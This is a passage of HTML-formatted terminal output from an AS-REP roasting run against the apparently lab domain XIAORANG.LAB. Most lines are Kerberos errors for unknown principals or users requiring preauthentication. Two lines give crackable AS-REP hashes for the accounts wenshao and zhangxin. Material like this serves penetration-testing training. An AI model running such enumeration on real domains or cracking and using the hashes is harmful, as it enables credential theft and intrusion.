Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User pangzhen doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User pengyuan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User qiaomei doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User qiyue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User rangsibo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User rubao doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User sheweiyue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User shuzhen doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User tangrong doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User tangshun doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User weicheng doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User weishengshan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User weixian doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User weixian doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User wenbiao doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User wenbo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User wengbang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User wenliang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User wohua doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User xiqidi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User xiyi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User xuanjiang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User yangju doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User yanglang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User yexing doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User yifu doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User yuanchang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User yulvxue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User zhaoxiu doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User zhenjun doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User zhufeng doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: 